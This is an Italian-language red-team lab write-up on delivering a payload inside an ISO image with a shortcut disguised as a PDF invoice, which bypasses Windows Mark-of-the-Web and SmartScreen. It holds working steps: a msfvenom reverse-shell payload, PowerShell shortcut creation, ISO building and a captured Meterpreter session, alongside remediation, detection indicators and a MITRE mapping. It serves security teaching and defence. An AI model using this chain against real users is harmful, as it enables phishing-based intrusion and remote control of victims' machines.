> [English](README.en.md) | **Italiano**

# ISO + LNK Delivery - Mark-of-the-Web Bypass Chain

> - **Fase:** Social Engineering - Payload Delivery via Container File (Post-Macro Kill)
> - **Visibilita:** Media - il file ISO e analizzabile da sandbox avanzate, ma il bypass MotW elude SmartScreen e il blocco macro; i file LNK con parametri sospetti sono rilevabili da EDR con regole specifiche
> - **Prerequisiti:** msfvenom per generazione payload; `mkisofs`/`genisoimage` per creazione ISO; conoscenza della struttura LNK per Windows; handler Metasploit in ascolto
> - **Output:** SE-009 (payload eseguito senza Mark-of-the-Web, bypass SmartScreen - severity Critico)

- **Ambiente Operativo:** Kali Linux Purple (Attaccante), Windows 10 22H2 VM (Vittima)
- **Target:** Utente che apre file ISO ricevuto via email o link
- **Tecniche Documentate:** ISO Container Mounting, LNK Shortcut Abuse, MotW Bypass, SmartScreen Evasion

---

## Executive Summary

Dopo che Microsoft ha bloccato le macro VBA di default per file con Mark-of-the-Web (luglio 2022), gli attaccanti hanno rapidamente adottato una nuova delivery chain basata su file container: ISO (immagine disco), IMG, e VHD. Il principio sfruttato e una lacuna nel modello di sicurezza Windows: quando un file ISO viene montato come drive virtuale, i file contenuti al suo interno non ereditano il Mark-of-the-Web dal file ISO padre. Questo significa che un payload o un LNK all'interno dell'ISO viene eseguito senza che SmartScreen o il blocco macro intervengano.

La catena documentata - file ISO contenente un LNK camuffato da documento e il payload nascosto - e stata il vettore principale di Bumblebee, Qakbot, IcedID e altri loader nel 2022-2023. Microsoft ha parzialmente mitigato il problema in aggiornamenti successivi (propagazione MotW ai file montati), ma la tecnica resta efficace su sistemi non aggiornati e con varianti (VHD, 7z, container nidificati).

---

## ISO + LNK: Esecuzione Payload senza MotW

**ID Finding:** `SE-009` | **Severity:** `Critico`

### Contesto operativo

Il laboratorio ha costruito una delivery chain completa: un file ISO contenente un LNK (shortcut Windows) con icona di documento PDF e un payload .exe nascosto (attributo hidden). Quando la vittima apre il file ISO, Windows lo monta come drive virtuale (es. `D:`). La vittima vede un apparente "Fattura.pdf" (in realta il LNK), lo apre, e il LNK esegue il payload nascosto. SmartScreen non interviene perche i file nel drive montato non hanno MotW.

### PoC - Fase 1: Creazione Payload

```Bash
# Generazione payload
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.110 LPORT=4444 -f exe -o payload.exe
```

```
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: payload.exe
```

### PoC - Fase 2: Preparazione Contenuto ISO

```Bash
# Creazione struttura directory per ISO
mkdir -p /tmp/iso_build
cp payload.exe /tmp/iso_build/

# Creazione file LNK (su Windows VM o con pylnk3 su Linux)
# Il LNK deve:
# - Avere icona di PDF (shell32.dll, icona #19)
# - Nome: "Fattura_Q1_2026.pdf.lnk" (estensione .lnk nascosta di default)
# - Target: "cmd.exe /c start payload.exe"
```

```Bash
# Alternativa: creazione LNK con PowerShell (sulla VM Windows)
# $ws = New-Object -ComObject WScript.Shell
# $lnk = $ws.CreateShortcut("D:\Fattura_Q1_2026.pdf.lnk")
# $lnk.TargetPath = "cmd.exe"
# $lnk.Arguments = "/c start payload.exe"
# $lnk.IconLocation = "shell32.dll,19"
# $lnk.Save()
```

### PoC - Fase 3: Creazione Immagine ISO

```Bash
# Impostare attributo hidden sul payload
# (in ambiente Windows: attrib +h payload.exe)

# Creazione ISO
mkisofs -o fattura_documents.iso -J -r /tmp/iso_build/
```

```
Total translation table size: 0
Total rockridge attributes bytes: 0
Total directory bytes: 0
Path table size(bytes): 10
Max brk space used 0
7168 extents written (14 MB)                                <-- ISO creato
```

### PoC - Fase 4: Verifica Assenza MotW

```Bash
# Sulla macchina Windows, dopo il download del file ISO:
# Verifica MotW sul file ISO stesso
powershell -c "Get-Content -Path 'C:\Users\victim\Downloads\fattura_documents.iso' -Stream Zone.Identifier"
```

```
[ZoneTransfer]
ZoneId=3                                                    <-- MotW presente sull'ISO (scaricato da Internet)
```

```Bash
# Dopo il mount dell'ISO (doppio click):
# Verifica MotW sui file DENTRO il drive montato
powershell -c "Get-Content -Path 'D:\payload.exe' -Stream Zone.Identifier"
```

```
Get-Content : Could not open the alternate data stream 'Zone.Identifier'    <-- NESSUN MotW!
                                                                             <-- SE-009: bypass confermato
```

### PoC - Fase 5: Esecuzione e Callback

```
# La vittima fa doppio click su "Fattura_Q1_2026.pdf" (il LNK):
# 1. cmd.exe si avvia (nascosto)
# 2. payload.exe viene eseguito
# 3. SmartScreen NON interviene (nessun MotW sul file)

[*] Meterpreter session 1 opened (192.168.0.110:4444 -> 192.168.0.120:49903)    <-- SE-009
meterpreter > getuid
Server username: DESKTOP-LAB\mario.rossi
```

### Remediation

- **Azione immediata:** isolamento della macchina; terminazione del processo cmd.exe/payload.exe; verifica di persistence e lateral movement
- **Azione strutturale:** applicazione aggiornamenti Windows che propagano MotW ai file montati da ISO/VHD (KB5006674 e successivi); configurazione ASR rule `Block executable files from running unless they meet a prevalence, age, or trusted list criterion`; blocco del mount automatico di file ISO/IMG/VHD via Group Policy (`Administrative Templates > Windows Components > AutoPlay Policies`); deploy di EDR con regole specifiche per processi figli di explorer.exe lanciati da drive virtuali montati
- **Verifica:** tentativo di esecuzione di .exe da ISO montata - SmartScreen deve intervenire se gli aggiornamenti sono applicati; verifica ASR rule trigger nei log Microsoft Defender

---

## Esperienza di Laboratorio

L'ambiente e stato configurato con Windows 10 22H2 senza gli aggiornamenti che propagano il MotW ai file montati, per simulare la finestra di vulnerabilita che ha caratterizzato il 2022-2023. Il primo tentativo ha utilizzato un ISO con solo il payload .exe visibile: la vittima vedeva chiaramente un eseguibile, rendendo l'attacco poco convincente. La seconda iterazione ha introdotto il file LNK con icona PDF e il payload con attributo hidden, ottenendo un risultato visivamente identico a un documento legittimo.

La verifica dell'assenza di MotW e stata il momento piu istruttivo: il comando `Get-Content -Stream Zone.Identifier` restituisce un errore esplicito quando il file non ha l'alternate data stream Zone.Identifier, confermando che Windows non propaga il MotW dal file ISO ai file contenuti nel drive montato. Questa e una conseguenza dell'implementazione: l'ISO viene montato come filesystem CDFS/UDF che non supporta gli NTFS alternate data streams.

Un aspetto critico scoperto durante il test: l'estensione `.lnk` non e visibile di default in Windows Explorer (anche con "Mostra estensioni" abilitato), rendendo il file `Fattura_Q1_2026.pdf.lnk` indistinguibile da un vero PDF.

---

## Analisi Teorica: Il Modello MotW e i Suoi Limiti

Il Mark-of-the-Web e un meccanismo di sicurezza implementato come NTFS Alternate Data Stream (ADS) denominato `Zone.Identifier`. Quando un file viene scaricato da Internet (zona 3), Windows scrive un ADS con il ZoneId che indica la provenienza. SmartScreen, il blocco macro, e altre difese di Windows consultano questo flag per decidere se applicare restrizioni.

Il problema architetturale sfruttato da questa tecnica e duplice:

1. **I filesystem non-NTFS non supportano ADS:** quando un file ISO viene montato, Windows crea un drive virtuale con filesystem CDFS o UDF. Questi filesystem non supportano gli alternate data streams NTFS, quindi il MotW non puo essere scritto sui file contenuti.

2. **La propagazione MotW non era implementata:** fino agli aggiornamenti correttivi, Windows non propagava automaticamente il MotW dal container (ISO) ai file estratti/montati.

Questa lacuna e stata sfruttata sistematicamente nel 2022-2023 dai principali loader malware (Bumblebee, Qakbot, IcedID, Emotet). La risposta di Microsoft e stata duplice: propagazione MotW ai file estratti da container (aggiornamenti 2022-2023) e introduzione di restrizioni aggiuntive nel mounting automatico di file ISO (Windows 11 23H2+). Tuttavia, la catena resta efficace su sistemi non aggiornati - una finestra significativa in ambienti enterprise con cicli di patching lenti.

---

## Scenario Reale: Proiezione Post-Exploitation

> Questa sezione descrive come questo finding si inserirebbe in un engagement reale.

### Prospettiva Attaccante (Red Team)

**Punto di partenza:** reverse shell da ISO+LNK senza alert SmartScreen (SE-009).

**Kill Chain proiettata:**

```
[SE-009] ISO+LNK delivery -> payload eseguito senza MotW
        |
        v
Meterpreter session -> process migration in svchost.exe
        |
        v
Persistence -> scheduled task / registry run key
        |
        v
Credential Access -> LSASS dump / SAM extraction
        |
        v
Lateral Movement -> Domain Controller compromise
```

**Impatto potenziale:** l'assenza di alert SmartScreen significa che l'attacco non genera log di sicurezza iniziali, ritardando la detection. In un'organizzazione con patching lento e senza EDR avanzato, il tempo medio di dwell time puo superare i 200 giorni (Mandiant M-Trends 2024).

### Prospettiva Difensore (Blue Team)

**IOC da monitorare:**
- Mount di file ISO/IMG/VHD da directory Downloads (Event ID Sysmon 12/13)
- Esecuzione di .exe da drive letter diverso da C: (drive montato)
- Processo cmd.exe/powershell.exe figlio di explorer.exe con path su drive virtuale
- File LNK con target sospetto (cmd.exe /c, powershell.exe, mshta.exe)

**Hardening:**
- Blocco mount ISO/VHD per utenti standard (GPO AutoPlay)
- ASR rule per processi da drive non standard
- EDR rule: alert su esecuzione da drive rimovibili/virtuali senza MotW

---

## Mappatura MITRE ATT&CK

| Tattica | Tecnica | ID MITRE | Descrizione dell'Azione |
| :--- | :--- | :--- | :--- |
| Resource Development | Develop Capabilities: Malware | `T1587.001` | Creazione delivery chain ISO + LNK + payload nascosto |
| Initial Access | Phishing: Spearphishing Attachment | `T1566.001` | File ISO inviato come allegato o link di download |
| Execution | User Execution: Malicious File | `T1204.002` | La vittima monta l'ISO e clicca il LNK camuffato da PDF (SE-009) |
| Defense Evasion | Subvert Trust Controls: Mark-of-the-Web Bypass | `T1553.005` | I file nel drive montato non hanno MotW, SmartScreen non interviene |
| Defense Evasion | Masquerading: Match Legitimate Name or Location | `T1036.005` | LNK con nome "Fattura_Q1_2026.pdf" e icona PDF |
| Defense Evasion | Hide Artifacts: Hidden Files and Directories | `T1564.001` | Payload con attributo hidden nel filesystem ISO |
| Command and Control | Non-Standard Port | `T1571` | Reverse TCP Meterpreter su porta 4444 |

---

> **Nota:** Tutte le attivita documentate sono state condotte in un ambiente di laboratorio virtualizzato. I file ISO e i payload sono stati testati esclusivamente su macchine virtuali di proprieta dell'autore. Nessun file e stato distribuito a persone o sistemi reali.
